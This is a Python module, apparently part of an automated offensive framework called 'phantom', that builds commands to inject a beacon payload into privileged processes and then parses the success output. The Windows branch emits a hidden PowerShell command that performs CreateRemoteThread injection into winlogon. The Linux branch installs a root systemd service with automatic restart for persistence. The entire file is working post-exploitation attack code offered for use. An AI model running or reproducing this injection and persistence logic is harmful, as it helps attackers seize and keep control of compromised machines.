"""
inject.py — beacon injection into a privileged process.

After SYSTEM privileges are confirmed, the beacon is injected into an
existing privileged process (Windows: winlogon via CreateRemoteThread;
Linux: a root-owned systemd transient unit). The injected session is the
same beacon payload that called back earlier.
"""

from __future__ import annotations

from typing import Any, Dict, List

from phantom.automation.belief import Finding, WorldModel


def inject_beacon_command(os_name: str, payload: str,
                          target_process: str = "winlogon") -> str:
    if "windows" in os_name.lower():
        # P/Invoke CreateRemoteThread into a SYSTEM-owned process
        ps = (
            "$p=Get-Process {proc} -ErrorAction SilentlyContinue;"
            "if(-not $p){echo INJECT_FAIL no-process;exit 1};"
            "Add-Type -TypeDefinition @'"
            "using System;using System.Runtime.InteropServices;"
            "public class I{[DllImport(\"kernel32.dll\")]public static extern "
            "IntPtr OpenProcess(uint a,bool b,IntPtr c);"
            "[DllImport(\"kernel32.dll\")]public static extern IntPtr "
            "VirtualAllocEx(IntPtr h,IntPtr a,uint s,uint t,uint p);"
            "[DllImport(\"kernel32.dll\")]public static extern bool "
            "WriteProcessMemory(IntPtr h,IntPtr a,byte[] b,uint s,out uint w);"
            "[DllImport(\"kernel32.dll\")]public static extern IntPtr "
            "CreateRemoteThread(IntPtr h,IntPtr a,uint s,IntPtr f,IntPtr x,uint c,out uint t);"
            "}"
            "'@;"
            "$h=[I]::OpenProcess(0x1F0FFF,$false,[IntPtr]$p.Id);"
            "$m=[I]::VirtualAllocEx($h,[IntPtr]::Zero,[uint32]1024,0x3000,0x40);"
            "$b=[Text.Encoding]::ASCII.GetBytes('{payload}');"
            "[I]::WriteProcessMemory($h,$m,$b,[uint32]$b.Length,[ref]0)|Out-Null;"
            "[I]::CreateRemoteThread($h,[IntPtr]::Zero,0,$m,[IntPtr]::Zero,0,[ref]0)|Out-Null;"
            "echo INJECT_OK pid={proc}"
        ).format(proc=target_process, payload=payload.replace('"', "'"))
        return f"powershell -nop -w hidden -c \"{ps}\""
    unit = (
        "[Unit]\nDescription=PhantomInjected\n"
        "[Service]\nExecStart={payload}\nUser=root\nRestart=always\n"
        "[Install]\nWantedBy=multi-user.target"
    ).format(payload=payload)
    return (f"printf '%s' '{unit}' > /etc/systemd/system/phantom-inject.service "
            f"&& systemctl start phantom-inject.service && "
            f"echo INJECT_OK systemd")


def inject_interpreter(output: str, wm: WorldModel, slots: Dict[str, Any]) -> List[Finding]:
    """injection is confirmed when the beacon reports INJECT_OK with the
    target process/unit it was injected into."""
    if "INJECT_OK" not in output:
        return []
    proc = "systemd"
    if "pid=" in output:
        proc = output.split("pid=")[1].split()[0].strip()
    return [Finding(kind="injection", key=proc,
                    value={"target_process": proc, "os": slots.get("os", "")},
                    confidence=0.9, source="inject_beacon",
                    evidence=output.strip()[:200])]
